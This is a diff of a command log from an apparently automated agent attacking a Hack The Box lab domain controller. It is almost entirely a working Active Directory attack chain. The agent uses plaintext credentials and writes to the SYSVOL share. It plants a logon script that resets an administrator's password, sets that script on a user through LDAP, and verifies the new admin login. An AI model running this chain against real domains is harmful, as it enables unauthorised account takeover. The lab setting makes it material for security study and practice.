@@ -1,6 +1,86 @@
-[19:06:04] READ: /htb/machines/garfield/state/creds.jsonl
-[19:06:07] RUN: impacket-addcomputer -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
-[19:06:10] RUN: which addcomputer.py 2>/dev/null || find / -name "addcomputer.py" -type f 2>/dev/null | head -3
-[19:06:20] RUN: addcomputer.py -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
-[19:06:23] RUN: /home/hacker/.local/bin/addcomputer.py -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
-[19:06:46] RUN: ip addr show tun0 2>&1; ping -c 1 -W 3 10.129.17.178 2>&1
+[19:21:17] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
+[19:21:18] RUN: cat /htb/machines/garfield/state/surface.jsonl 2>/dev/null | grep -i domain | head -5
+[19:21:19] RUN: cat /htb/machines/garfield/state/tested.jsonl 2>/dev/null | grep -i rbcd | tail -5
+[19:21:22] RUN: cat /etc/hosts | grep garfield
+[19:21:22] RUN: ping -c 1 -W 2 10.129.17.158
+[19:21:26] RUN: sudo sed -i 's/10.129.17.178/10.129.17.158/g' /etc/hosts && cat /etc/hosts | grep garfield
+[19:21:28] RUN: cp /etc/hosts /tmp/hosts.bak && cat /etc/hosts | sed 's/10.129.17.178/10.129.17.158/g' > /tmp/hosts.new && cat /tmp/hosts.new | sudo tee /etc/hosts > /dev/null && cat /etc/hosts | grep garfield
+[19:21:32] RUN: nxc smb 10.129.17.158 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb 2>&1 | head -5
+[19:21:34] RUN: crackmapexec smb 10.129.17.158 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb 2>&1 | head -5
+[19:21:40] RUN: impacket-addcomputer -computer-name 'NEWPC$' -computer-pass 'NewComputerPass123!' -dc-ip 10.129.17.158 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' 2>&1
+[19:23:11] RUN: smbclient //10.129.17.158/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'ls' 2>&1
+[19:23:14] RUN: smbclient //10.129.17.158/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'put /dev/null test_write_check; rm test_write_check' 2>&1
+[19:23:17] RUN: echo "test" > /tmp/sysvol_write_test.txt && smbclient //10.129.17.158/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb; cd scripts; put /tmp/sysvol_write_test.txt test_write.txt; rm test_write.txt' 2>&1
+[19:25:02] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
+[19:25:02] RUN: cat /etc/hosts | grep garfield
+[19:25:06] RUN: smbclient //10.129.17.158/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'ls' 2>&1 | head -20
+[19:25:12] RUN: # First, create the bat file locally
+cat > /tmp/pwreset.bat << 'BATEOF'
+@echo off
+powershell.exe -NoProfile -Command "Set-ADAccountPassword -Identity 'l.wilson_adm' -Reset -NewPassword (ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force)"
+BATEOF
+
+# Upload to NETLOGON via SYSVOL
+smbclient //10.129.17.158/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put /tmp/pwreset.bat pwreset.bat; ls' 2>&1
+[19:25:17] RUN: # Use bloodyAD or ldapmodify to set scriptPath for l.wilson
+# Try bloodyAD first
+bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.158 set object 'l.wilson' 'scriptPath' -v 'pwreset.bat' 2>&1
+[19:25:20] RUN: python3 -c "from bloodyAD import main" 2>&1; which bloodyAD 2>&1; pip show bloodyAD 2>&1 | head -5
+[19:25:24] RUN: python3 -m bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.158 set object 'l.wilson' 'scriptPath' -v 'pwreset.bat' 2>&1
+[19:25:30] RUN: # Use ldapmodify or python-ldap instead
+# First try with ldap3 python library
+python3 -c "
+import ldap3
+server = ldap3.Server('10.129.17.158', get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user='garfield.htb\\\\j.arbuckle', password='Th1sD4mnC4t!@1978', authentication=ldap3.NTLM)
+conn.bind()
+print('Bind result:', conn.result)
+# Set scriptPath for l.wilson
+conn.modify('CN=l.wilson,CN=Users,DC=garfield,DC=htb', {'scriptPath': [(ldap3.MODIFY_REPLACE, ['pwreset.bat'])]})
+print('Modify result:', conn.result)
+conn.unbind()
+" 2>&1
+[19:25:35] RUN: python3 -c "
+import ldap3
+server = ldap3.Server('10.129.17.158', get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user='garfield.htb\\\\j.arbuckle', password='Th1sD4mnC4t!@1978', authentication=ldap3.NTLM)
+conn.bind()
+conn.search('DC=garfield,DC=htb', '(sAMAccountName=l.wilson)', attributes=['distinguishedName','scriptPath'])
+for e in conn.entries:
+    print(e)
+conn.unbind()
+" 2>&1
+[19:25:41] RUN: python3 -c "
+import ldap3
+server = ldap3.Server('10.129.17.158', get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user='garfield.htb\\\\j.arbuckle', password='Th1sD4mnC4t!@1978', authentication=ldap3.NTLM)
+conn.bind()
+conn.modify('CN=Liz Wilson,CN=Users,DC=garfield,DC=htb', {'scriptPath': [(ldap3.MODIFY_REPLACE, ['pwreset.bat'])]})
+print('Modify result:', conn.result)
+# Verify
+conn.search('DC=garfield,DC=htb', '(sAMAccountName=l.wilson)', attributes=['scriptPath'])
+for e in conn.entries:
+    print('scriptPath set to:', e.scriptPath)
+conn.unbind()
+" 2>&1
+[19:25:48] RUN: # Wait a bit for the logon script to execute, then test l.wilson_adm creds
+sleep 15 && smbclient //10.129.17.158/C$ -U 'garfield.htb/l.wilson_adm%P@ssw0rd2026!' -c 'ls' 2>&1 | head -10
+[19:26:08] RUN: # Test with LDAP bind - more reliable auth check
+python3 -c "
+import ldap3
+server = ldap3.Server('10.129.17.158', get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user='garfield.htb\\\\l.wilson_adm', password='P@ssw0rd2026!', authentication=ldap3.NTLM)
+conn.bind()
+print('Bind result:', conn.result)
+conn.unbind()
+" 2>&1
+[19:26:14] RUN: # Clean up - remove the scriptPath to avoid repeated execution
+python3 -c "
+import ldap3
+server = ldap3.Server('10.129.17.158', get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user='garfield.htb\\\\j.arbuckle', password='Th1sD4mnC4t!@1978', authentication=ldap3.NTLM)
+conn.bind()
+conn.modify('CN=Liz Wilson,CN=Users,DC=garfield,DC=htb', {'scriptPath': [(ldap3.MODIFY_DELETE, [])]})
+print('Cleanup result:', conn.result)
+conn.unbind()
+" 2>&1
